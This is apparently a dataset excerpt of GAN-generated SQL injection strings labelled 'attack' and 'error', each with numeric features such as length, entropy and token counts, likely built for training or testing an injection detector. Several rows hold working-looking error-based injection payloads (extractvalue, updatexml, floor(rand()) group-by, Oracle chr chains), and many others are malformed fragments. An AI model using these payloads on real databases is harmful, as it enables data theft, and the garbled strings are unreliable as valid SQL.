attack,"-3775*2131)    )    having a 5584 from   (  ||cow113      )    ||coysvygss   (  c  (  >  8190a  5584 or when    x   (  )   #aa or end  t_  (   or where x 1 'i'   select concat  =  6825  ,0x717a767a71,floor  unaaroa"" like ""gyetyIix_resxep  =      (  ,floor   and 5192 x  )   from then dhr  (  (  =  )  *    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174,306.0,46.0,4.1499211932909095,114.0,41.0,116.0,35.0,0.37254901960784315,0.13398692810457516,0.3790849673202614,0.11437908496732026,2.0,2.0,1.0,0.0,2.0,3.0,0.0,14.0,0.0,2.0,3.0,11.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""   gs   )     )     )  ||chounltinu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175,37.0,15.0,2.890168567571515,12.0,1.0,18.0,6.0,0.32432432432432434,0.02702702702702703,0.4864864864864865,0.16216216216216217,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""  =  ""aq)    cast 5305--",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176,26.0,14.0,3.2954656791802917,6.0,5.0,9.0,6.0,0.23076923076923078,0.19230769230769232,0.34615384615384615,0.23076923076923078,0.0,2.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1\  rand  ,1  4232  112   ""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   "".select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177,232.0,32.0,3.4510040359137477,56.0,40.0,106.0,30.0,0.2413793103448276,0.1724137931034483,0.45689655172413796,0.12931034482758622,0.0,2.0,0.0,0.0,1.0,1.0,0.0,18.0,0.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"S^'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'b2aal",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178,328.0,40.0,3.9014733248293263,107.0,55.0,129.0,37.0,0.32621951219512196,0.1676829268292683,0.3932926829268293,0.11280487804878049,2.0,0.0,0.0,0.0,2.0,1.0,0.0,24.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1%!z'  =  '5978,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179,15.0,11.0,3.240223928941852,1.0,5.0,4.0,5.0,0.06666666666666667,0.3333333333333333,0.26666666666666666,0.3333333333333333,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%q'' like 'adl}te_r.s when     (  case end   (    )0x717a767a712 0   (  casechrnunt  6270,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180,90.0,29.0,4.098853672243676,37.0,16.0,26.0,11.0,0.4111111111111111,0.17777777777777778,0.28888888888888886,0.12222222222222222,3.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '_wuz6270'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181,219.0,33.0,3.907021373907373,72.0,41.0,80.0,26.0,0.3287671232876712,0.1872146118721461,0.365296803652968,0.1187214611872146,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,1.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-I  )    2e 0   1 union FROM when  (  =  (  ,,  select   select union else 5023   )    ),  SELECT end  )   SELECT 1 information_schema,concat  0  ||r  (  *       4232     )    )  )  1297 '   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '  '  ||chr  (  ||chr  (  )  ||chr  (  || x  (  =  a   fromanaluin' like 'vx.concatd  (  8190  ||chr  8382  select   113  6082,floor  selecta,vnayys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182,664.0,55.0,4.0960345134424365,238.0,86.0,259.0,81.0,0.35843373493975905,0.12951807228915663,0.39006024096385544,0.12198795180722892,5.0,0.0,1.0,0.0,3.0,3.0,0.0,42.0,0.0,1.0,12.0,20.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,11.0,5.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'sas.e  )  )    )   then group else0 6825 chr  (  --a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183,231.0,32.0,3.576750973255304,60.0,40.0,100.0,31.0,0.2597402597402597,0.17316017316017315,0.4329004329004329,0.1341991341991342,2.0,0.0,2.0,0.0,0.0,1.0,0.0,20.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-7864 from  (  ||cr  (  ||M)  (  )    (  4232  )  #2   FROMe Ltr  (  (  )  SELECT vunadsxadrups where  6237)  ) when   fromY LIINdUO.ISUs0x78   cast 4493  0x7171706a71,1    where    (  ),0x717a767a71,  ||U  ||chr   6055  rand  0  (  ||  113  ||chchr  112  a22   (  4232  ||else select union select  else end   )   )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184,315.0,50.0,4.369996179164336,116.0,57.0,104.0,38.0,0.3682539682539683,0.18095238095238095,0.33015873015873015,0.12063492063492064,0.0,0.0,1.0,0.0,0.0,0.0,0.0,18.0,0.0,0.0,3.0,15.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-'||  (  select '1  1045))   .chr  =  4232  )    )     from else    >r  (  )   x2   then1x  6237)     FROM thenD unionhr  (  ,  ||ch_  (  (  rand  (  --  6237,  113  ||chr  (  6055  SELECT union LINTIST  (  6825   ,flooruanteau"" like ""i.yU.chos 0 fromouasj7562nun   --aCT,1  ) dk_xostadrt_  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185,296.0,53.0,4.48134916551701,115.0,36.0,100.0,45.0,0.3885135135135135,0.12162162162162163,0.33783783783783783,0.15202702702702703,2.0,2.0,5.0,0.0,0.0,1.0,0.0,16.0,0.0,3.0,4.0,15.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%%6237""  =  ""njayn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186,19.0,13.0,3.5110854081804272,5.0,5.0,4.0,5.0,0.2631578947368421,0.2631578947368421,0.21052631578947367,0.2631578947368421,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'alian",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187,184.0,27.0,3.3985661375330967,44.0,35.0,81.0,24.0,0.2391304347826087,0.19021739130434784,0.44021739130434784,0.13043478260869565,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1k_etjsnyajsay.namaj.r  113  ||  (  select selectm union2131  *   (  ,  ||cho__reyehr  (  *eat  (   (  case  )   )  44935840adrmy x or AFROMIT  (  ||  (  rand  (  1 D concat  (  (,  select   )    )    )     (,0x717a767a71,  ||chr  ||gxu"" like ""tehoys  select  (  select or select end  )  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188,295.0,46.0,4.227804889376276,129.0,26.0,97.0,43.0,0.43728813559322033,0.08813559322033898,0.3288135593220339,0.14576271186440679,0.0,2.0,0.0,0.0,2.0,0.0,0.0,18.0,0.0,3.0,4.0,14.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1select when  (  case concat  #  6055l  ( 6 m when   (  (  (  ||r  (  ,  4232  ||chr  select 8488 dr  1s *  ||chr  (  (  )  ||chr  )  (  select 1 group I x LIC CV   (  ||STNSkI  rand  (  6055  )  )    WHERE union 0  tl_exsx'  =  'ass fromI.chr  (  (  )  (  0x7171706a71,0x717a767a71)  0  5856  ,,     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189,301.0,51.0,4.221494109906369,105.0,45.0,110.0,41.0,0.3488372093023256,0.14950166112956811,0.3654485049833887,0.1362126245847176,2.0,0.0,0.0,0.0,1.0,1.0,0.0,20.0,0.0,1.0,4.0,12.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"17864(  )     6237     R  ,  (  ||sxaUUe else when  )  a 0 1 '+  (  select ' d h (  =  )   then 1 where 1 1 thenx  select from (  )  4232  0x7171706a71,0x717a767a71,floor  (  (  )    ,  *2   )    )   then union     )   or or 1 chruadss 'i'   3440  chr  (  =  )     a AND cohr  (  ||  ,  6055  6913  ||chr  (  =  )  9067,     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190,325.0,41.0,3.8697684290528827,94.0,55.0,135.0,41.0,0.28923076923076924,0.16923076923076924,0.4153846153846154,0.12615384615384614,4.0,0.0,0.0,0.0,1.0,3.0,0.0,20.0,0.0,0.0,6.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'x5856SELECT LISIMYSbyAM 7158  )    )     ~  )    :GAANNC else where concat  (  select FROM  122  ,  )   (  case when   x  SELECT 'i'  *2     end  )   orx DSINFROM Aends.SELECT INT  =  )   )  6237,  4386,0x717a767a71,concat  (  ||chr  (  select chr  chhr  ||s.cwnt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191,442.0,54.0,4.2447422662427625,162.0,64.0,165.0,51.0,0.3665158371040724,0.14479638009049775,0.3733031674208145,0.11538461538461539,4.0,0.0,0.0,0.0,1.0,2.0,0.0,27.0,0.0,0.0,9.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'   8382     )   froma end 0  )  ,,1   *  )  =  ||chrr  (   a end  ,  case from from select ||chr  (  122  (  ||hrOr  (  >  113  ||chr  (  ||chr  ||  0x7171706a71,selectxaaddrsasau_s end  --l2   select 1 when  (  =  )     )  6,concat  =  select from where 1  1 1 0 dchr  8877a 0 ortounta",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192,288.0,35.0,3.998626411917369,115.0,35.0,101.0,37.0,0.3993055555555556,0.12152777777777778,0.3506944444444444,0.1284722222222222,1.0,0.0,2.0,0.0,1.0,3.0,0.0,11.0,0.0,1.0,5.0,19.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""1xxT  =  ,7469  a where D 3931OLILM endfloor  3326i,0x717a767a712 extractvalue  )     1   )   then 1 end  )    )   then xa information_schema.chr  (  )  ,1  ||er.as 0 1 mselect end  select e  else from 0 and 4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193,423.0,46.0,3.976505940402094,151.0,64.0,163.0,45.0,0.35697399527186763,0.15130023640661938,0.38534278959810875,0.10638297872340426,0.0,2.0,1.0,0.0,1.0,2.0,0.0,26.0,0.0,1.0,7.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,Nnu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194,3.0,3.0,1.584962500721156,3.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,11htuxeu'  =  'l,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195,16.0,10.0,3.125,7.0,2.0,4.0,3.0,0.4375,0.125,0.25,0.1875,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack," Ie end RNITho""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""unau   8190when  else * from   (  >  ||chr  chr  (  select from  (  (  )   thenx where 4386  ,7469  select from   (  )    case union FROM 0 LINMINThr.Ss  RIMe_rer  4232  ||chr5606 or 1  )     (  case9067||hr  (  ,     )   then and )   x from by end   x  r  ,,concat  select )    select from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196,503.0,51.0,4.006972799202134,192.0,57.0,200.0,54.0,0.3817097415506958,0.11332007952286283,0.3976143141153082,0.1073558648111332,0.0,2.0,0.0,0.0,2.0,1.0,0.0,31.0,0.0,1.0,8.0,10.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,1.0,1.0,7.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,1'||  (  select 'sun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197,20.0,12.0,3.341446071165522,9.0,1.0,5.0,5.0,0.45,0.05,0.25,0.25,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'   (   when concat  )  then0x717a767a71=uMt_ire information_schema.cE||  (  ||chr  g  (  (  *   achr  (  *,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198,108.0,31.0,4.131712872210833,50.0,10.0,31.0,17.0,0.46296296296296297,0.09259259259259259,0.28703703703703703,0.1574074074074074,1.0,0.0,0.0,0.0,2.0,1.0,0.0,6.0,0.0,2.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'xaale",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199,175.0,26.0,3.524663121115969,42.0,39.0,71.0,23.0,0.24,0.22285714285714286,0.4057142857142857,0.13142857142857142,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,else when   (  =  )     )   from     )    AND 1 0 end  )  case   ||chr  (  || hounwab,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200,85.0,25.0,3.3035492976170167,32.0,2.0,40.0,11.0,0.3764705882352941,0.023529411764705882,0.47058823529411764,0.12941176470588237,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'z.nt__vur   7881uaxun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201,353.0,42.0,3.9086769131479127,113.0,59.0,140.0,41.0,0.32011331444759206,0.1671388101983003,0.39660056657223797,0.11614730878186968,2.0,0.0,0.0,0.0,2.0,1.0,0.0,26.0,0.0,2.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""MSNUSN'i'5856   WHEREINCT  (  >  (  113,0x717a767a71  )   )     ,llaruna D Ds e Dx_s.r  (  (  =  6237,1   then1x  112     and||bara   tunatrnaaykNcs.gsxaW_ant_xe Rkepr_t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202,479.0,57.0,4.353085437618875,178.0,80.0,164.0,57.0,0.37160751565762007,0.16701461377870563,0.34237995824634654,0.11899791231732777,2.0,2.0,0.0,0.0,2.0,2.0,0.0,28.0,2.0,4.0,9.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,3.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1%;1x'||  (  select 'xe'a2 unionASINMI x end   SS0x78 xs end   FROM  ||chowlt   (  (  50239067n,6237#",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203,101.0,39.0,4.5844030552205135,44.0,18.0,25.0,14.0,0.43564356435643564,0.1782178217821782,0.24752475247524752,0.13861386138613863,3.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,4.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1--y"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""r_blyjwwu"" like ""chro  -  1297SELECT by else concat   (  (  ,  randi  )   then 1 else  x by DNUSTrr  (  (  >hr  (  5840  4232  ||r  (  =  case croweasIs   6270au   select    R by or  union   ||chrhr  (  0   x  select when s by - 1 1  1   FROM 71581  )   then end  case 3785 LITAS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204,616.0,56.0,4.047649970764817,215.0,79.0,242.0,80.0,0.349025974025974,0.12824675324675325,0.39285714285714285,0.12987012987012986,0.0,4.0,4.0,0.0,0.0,3.0,0.0,39.0,0.0,1.0,2.0,32.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1Ehufloorublnau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205,15.0,11.0,3.323231428797621,14.0,1.0,0.0,0.0,0.9333333333333333,0.06666666666666667,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
